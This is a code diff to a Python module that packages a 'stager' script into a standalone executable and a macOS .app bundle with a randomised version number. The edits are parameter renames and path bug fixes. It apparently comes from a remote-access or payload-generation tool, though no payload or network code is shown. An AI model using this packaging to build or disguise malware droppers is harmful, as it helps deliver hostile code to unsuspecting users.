@@ -7,6 +7,7 @@ import os
 import sys
 import imp
 import zlib
+import time
 import base64
 import random
 import marshal
@@ -176,7 +177,7 @@ def snippet(template='main', function='main', *args, **kwargs):
     else:
         raise ValueError("invalid argument 'template' (valid: main)")
 
-def exe(filename, icon=None, hidden_imports=None):
+def exe(filename, icon=None, hidden=None):
     """ 
     Compile the Python stager file into a standalone executable
     with a built-in Python interpreter
@@ -200,8 +201,8 @@ def exe(filename, icon=None, hidden_imports=None):
                 if ___ not in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                     imports.append(___)
     imports = list(set(imports))
-    if isinstance(hidden_imports, list):
-        imports.extend(hidden_imports)
+    if isinstance(hidden, list):
+        imports.extend(hidden)
     spec = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
     fspec = os.path.join(path, name + '.spec')
     with file(fspec, 'w') as fp:
@@ -229,13 +230,13 @@ def app(filename, icon=None):
     version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
     baseName = os.path.basename(filename)
     bundleName = os.path.splitext(baseName)[0]
-    pkgPath = os.path.join(basePath, 'PkgInfo')
-    appPath = os.path.join(os.getcwd(), '%.app' % bundleName)
+    appPath = os.path.join(os.getcwd(), '{}.app'.format(bundleName))
     basePath = os.path.join(appPath, 'Contents')
     distPath = os.path.join(basePath, 'MacOS')
     rsrcPath = os.path.join(basePath, 'Resources')
+    pkgPath = os.path.join(basePath, 'PkgInfo')
     plistPath = os.path.join(rsrcPath, 'Info.plist')
-    iconPath = os.path.basename(icon)
+    iconPath = os.path.basename(icon) if icon else ''
     executable = os.path.join(distPath, filename)
     bundleVersion = bundleName + ' ' + version
     bundleIdentity = 'com.' + bundleName
